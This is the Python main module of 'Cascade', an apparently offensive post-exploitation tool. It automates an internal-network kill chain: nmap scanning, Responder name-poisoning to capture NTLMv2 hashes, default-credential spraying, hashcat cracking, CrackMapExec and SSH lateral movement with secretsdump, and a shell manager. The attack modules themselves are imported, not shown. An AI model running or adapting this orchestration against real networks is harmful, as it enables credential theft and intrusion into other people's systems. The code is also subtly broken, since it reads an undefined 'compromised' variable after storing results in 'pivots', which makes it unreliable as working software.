#!/usr/bin/env python3
"""
Cascade — Post-Exploitation Orchestrator
=========================================
Automated kill chain for internal network compromise:

  Stage 1  Subnet recon      — nmap host & service discovery
  Stage 2  Hash harvest      — Responder passive NTLM capture
  Stage 3  Default cred spray — SSH / SMB / HTTP admin panels
  Stage 4  Hash cracking     — hashcat / john against captured hashes
  Stage 5  Lateral movement  — CrackMapExec + SSH pivoting

Usage:
  sudo cascade
  sudo cascade -i eth0 --subnet 10.10.10.0/24
  sudo cascade --stage 1
  sudo cascade --no-harvest
  sudo cascade --about

Only run against networks you own or have explicit written permission to test.
"""

import os, sys, argparse, shutil, time

from . import tui
from . import recon, harvest, spray, crack, lateral, shells

# ── tool dependency check ─────────────────────────────────────────────────────
_TOOLS = [
    ("nmap",            "sudo apt install nmap"),
    ("responder",       "sudo apt install responder"),
    ("hashcat",         "sudo apt install hashcat"),
    ("crackmapexec",    "sudo apt install crackmapexec"),
]

def _check_deps(skip_harvest: bool = False):
    missing = []
    for tool, install in _TOOLS:
        if tool == "responder" and skip_harvest:
            continue
        if not shutil.which(tool):
            missing.append((tool, install))
    return missing

# ── about ─────────────────────────────────────────────────────────────────────
def _print_about():
    from . import __version__
    tui.clear()
    tui.print_banner()
    print(f"""  {tui.WH}{tui.B}WHAT IS CASCADE  v{__version__}{tui.R}

  Cascade automates the internal network post-exploitation kill chain —
  everything after you have a foothold on a LAN segment. It chains five
  stages into a single command with a red TUI status feed.

  {tui.RED}{tui.B}STAGE 1 — Subnet Recon{tui.R}
    Runs nmap across the detected (or specified) subnet. Identifies live
    hosts, open ports, running services, and OS fingerprints.

  {tui.RED}{tui.B}STAGE 2 — Hash Harvest (Responder){tui.R}
    Launches Responder with WPAD + LLMNR + NBT-NS poisoning. Captures
    NTLMv2 challenge-response hashes from any machine on the segment
    that reaches out to resolve a name. Runs for a configurable window.

  {tui.RED}{tui.B}STAGE 3 — Default Credential Spray{tui.R}
    Tries a curated list of default/common creds against SSH, SMB, and
    HTTP admin panels on every discovered host. Threaded — all services
    in parallel. Stops per-host on first success.

  {tui.RED}{tui.B}STAGE 4 — Hash Cracking{tui.R}
    Feeds captured NTLMv2 hashes into hashcat (mode 5600) or john against
    rockyou.txt. Displays cracked plaintext passwords immediately.

  {tui.RED}{tui.B}STAGE 5 — Lateral Movement{tui.R}
    Uses every valid credential (sprayed + cracked) with CrackMapExec
    over SMB/WinRM and paramiko over SSH. Flags Pwn3d! hosts. Optionally
    runs secretsdump for hash extraction from compromised Windows boxes.

  {tui.WH}{tui.B}USAGE{tui.R}
    sudo cascade                        full auto on detected subnet
    sudo cascade -i eth0                specify interface
    sudo cascade --subnet 10.0.0.0/24   specify subnet manually
    sudo cascade --stage 3              run only stage 3 (cred spray)
    sudo cascade --no-harvest           skip Responder (quiet mode)
    sudo cascade --harvest-time 300     longer Responder window (seconds)
    sudo cascade -v                     verbose output
    sudo cascade --about                this screen

  {tui.DIM}Only run against networks you own or have explicit permission to test.{tui.R}
""")


# ── stage runners ─────────────────────────────────────────────────────────────

def stage1_recon(args) -> list[dict]:
    tui.phase("STAGE 1 — RECON")
    hosts = recon.scan(subnet=args.subnet, fast=not args.full_scan)
    if not hosts:
        tui.warn("No hosts found. Check interface and subnet.")
        return []
    tui.success(f"Found {len(hosts)} host(s)")
    tui.host_table(hosts)
    return hosts


def stage2_harvest(args) -> list[str]:
    tui.phase("STAGE 2 — HASH HARVEST")
    if args.no_harvest:
        tui.warn("Skipped (--no-harvest)")
        return []
    hashes = harvest.wait_and_capture(args.interface, timeout=args.harvest_time)
    if hashes:
        tui.success(f"Captured {len(hashes)} hash(es)")
        for h in hashes:
            print(f"    {tui.DIM}{h[:80]}{'…' if len(h) > 80 else ''}{tui.R}")
    else:
        tui.warn("No hashes captured — network may be quiet or Responder blocked")
    return hashes


def stage3_spray(hosts, args) -> list[dict]:
    tui.phase("STAGE 3 — CREDENTIAL SPRAY")
    if not hosts:
        tui.warn("No hosts to spray.")
        return []
    results = spray.spray(hosts, verbose=args.verbose)
    if results:
        tui.success(f"Spray found {len(results)} valid credential(s)")
        tui.cred_table(results)
    else:
        tui.warn("No default credentials found")
    return results


def stage4_crack(hashes, args) -> list[dict]:
    tui.phase("STAGE 4 — HASH CRACKING")
    if not hashes:
        tui.warn("No hashes to crack.")
        return []
    cracked = crack.crack_ntlmv2(hashes, wordlist=args.wordlist)
    if cracked:
        tui.success(f"Cracked {len(cracked)} hash(es)")
        for c in cracked:
            tui.cred_table([{"target": "N/A", "service": "ntlmv2",
                             "user": c["user"], "secret": c["password"]}])
    else:
        tui.warn("No hashes cracked")
    return cracked


def stage5_lateral(hosts, all_creds, args) -> list[dict]:
    """Returns list of { host, cred } dicts for compromised targets."""
    tui.phase("STAGE 5 — LATERAL MOVEMENT")
    if not all_creds:
        tui.warn("No credentials available for lateral movement.")
        return []

    compromised = []
    host_map    = {h["ip"]: h for h in hosts}

    raw_results = lateral.run_kill_chain(hosts, all_creds)
    for r in raw_results:
        if r.get("pwned"):
            host = host_map.get(r["ip"], {"ip": r["ip"], "hostname": "", "ports": []})
            cred = next(
                (c for c in all_creds if c["user"] == r.get("user")),
                all_creds[0]
            )
            compromised.append({"host": host, "cred": cred})

    if compromised:
        tui.success(f"Gained access to {len(compromised)} host(s)")
    else:
        tui.warn("No lateral movement succeeded")
    return compromised


# ── summary ───────────────────────────────────────────────────────────────────

def _print_summary(hosts, hashes, spray_creds, cracked, compromised):
    tui.phase("RESULTS")
    tui.stage_result("Recon",         bool(hosts),        f"{len(hosts)} host(s) found")
    tui.stage_result("Hash Harvest",  bool(hashes),       f"{len(hashes)} hash(es) captured")
    tui.stage_result("Cred Spray",    bool(spray_creds),  f"{len(spray_creds)} valid cred(s)")
    tui.stage_result("Hash Cracking", bool(cracked),      f"{len(cracked)} cracked")
    tui.stage_result("Lateral Move",  bool(compromised),  f"{len(compromised)} host(s) compromised")

    all_creds = spray_creds + [
        {"target": "N/A", "service": "ntlmv2", "user": c["user"], "secret": c["password"]}
        for c in cracked
    ]
    if all_creds:
        print()
        tui.success("Valid credentials:")
        tui.cred_table(all_creds)

    if compromised:
        print()
        tui.success("Compromised hosts:")
        for e in compromised:
            h = e["host"]; c = e["cred"]
            print(f"    {tui.GRN}{tui.B}{h['ip']:<16}{tui.R}  "
                  f"{tui.DIM}{h.get('hostname','')}  as {c['user']}{tui.R}")

    print()
    if compromised or all_creds:
        tui.success("Kill chain complete — access obtained.")
    else:
        tui.warn("Kill chain finished — no access gained. "
                 "Try longer harvest window or custom wordlist.")
    print()


# ── entry point ───────────────────────────────────────────────────────────────

def main():
    if os.geteuid() != 0:
        print("[!] Run as root: sudo cascade")
        sys.exit(1)

    ap = argparse.ArgumentParser(
        description="Cascade — Post-exploitation kill chain orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Only run against networks you own or have permission to test.",
    )
    ap.add_argument("-i", "--interface",    default="eth0",
                    help="Network interface (default: eth0)")
    ap.add_argument("--subnet",             metavar="CIDR",
                    help="Target subnet, e.g. 192.168.1.0/24 (auto-detect if omitted)")
    ap.add_argument("--stage", type=int,    choices=range(1, 6), default=0,
                    help="Run only a specific stage (1-5)")
    ap.add_argument("--no-harvest",         action="store_true",
                    help="Skip Responder hash harvesting (quiet/passive mode)")
    ap.add_argument("--harvest-time", type=int, default=120, metavar="SECS",
                    help="Responder capture window in seconds (default: 120)")
    ap.add_argument("--full-scan",          action="store_true",
                    help="Full nmap port scan instead of fast top-100")
    ap.add_argument("--wordlist",           metavar="FILE",
                    help="Custom wordlist for hash cracking")
    ap.add_argument("-v", "--verbose",      action="store_true",
                    help="Verbose output")
    ap.add_argument("--about",              action="store_true",
                    help="Detailed explanation of all stages")
    ap.add_argument("--shells",             action="store_true",
                    help="Open saved session manager directly")
    ap.add_argument("--version",            action="version",
                    version=f"cascade {__import__('cascade').__version__}")
    args = ap.parse_args()

    if args.about:
        _print_about()
        sys.exit(0)

    if args.shells:
        tui.clear()
        tui.print_banner()
        shells.saved_menu()
        sys.exit(0)

    tui.clear()
    tui.print_banner()

    # ── dependency check ───────────────────────────────────────────────────────
    missing = _check_deps(skip_harvest=args.no_harvest)
    if missing:
        tui.warn("Missing tools — install before running:")
        for tool, cmd in missing:
            print(f"    {tui.RED}{tui.B}{tool:<20}{tui.R}  {tui.DIM}{cmd}{tui.R}")
        print()
        cont = input(f"  {tui.WH}Continue anyway? [y/N] {tui.R}").strip().lower()
        if cont != "y":
            sys.exit(1)
        print()

    # ── single-stage mode ──────────────────────────────────────────────────────
    if args.stage:
        stage_map = {
            1: lambda: stage1_recon(args),
            2: lambda: stage2_harvest(args),
            3: lambda: (stage3_spray(stage1_recon(args), args)),
            4: lambda: stage4_crack([], args),
            5: lambda: stage5_lateral([], [], args),
        }
        stage_map[args.stage]()
        sys.exit(0)

    # ── full kill chain ────────────────────────────────────────────────────────
    hosts       = []
    hashes      = []
    spray_creds = []
    cracked     = []
    pivots      = []

    try:
        hosts       = stage1_recon(args)
        hashes      = stage2_harvest(args)
        spray_creds = stage3_spray(hosts, args)
        cracked     = stage4_crack(hashes, args)

        all_creds = spray_creds + [
            {"target": "N/A", "service": "ntlmv2",
             "user": c["user"], "secret": c["password"]}
            for c in cracked
        ]
        pivots = stage5_lateral(hosts, all_creds, args)

    except KeyboardInterrupt:
        print(f"\n\n  {tui.DIM}Interrupted.{tui.R}\n")

    _print_summary(hosts, hashes, spray_creds, cracked, compromised)

    # ── shell manager ──────────────────────────────────────────────────────────
    if compromised:
        ans = input(f"  {tui.WH}{tui.B}Open shell manager? [Y/n] {tui.R}").strip().lower()
        if ans != "n":
            shells.access_menu(compromised)
    elif any([spray_creds, cracked]):
        # We have creds but lateral movement didn't confirm Pwn3d — still offer shells
        # Build compromised list from all hosts + creds for manual attempt
        all_creds = spray_creds + [
            {"target": "N/A", "service": "ntlmv2",
             "user": c["user"], "secret": c["password"]}
            for c in cracked
        ]
        guesses = [{"host": h, "cred": all_creds[0]} for h in hosts
                   if any(p in (h.get("ports") or []) for p in [22, 445, 5985])]
        if guesses:
            ans = input(f"  {tui.WH}{tui.B}Try manual shell with found credentials? [Y/n] {tui.R}").strip().lower()
            if ans != "n":
                shells.access_menu(guesses)

    # Always offer saved sessions
    ans = input(f"  {tui.WH}{tui.B}Open saved sessions? [y/N] {tui.R}").strip().lower()
    if ans == "y":
        shells.saved_menu()


if __name__ == "__main__":
    main()
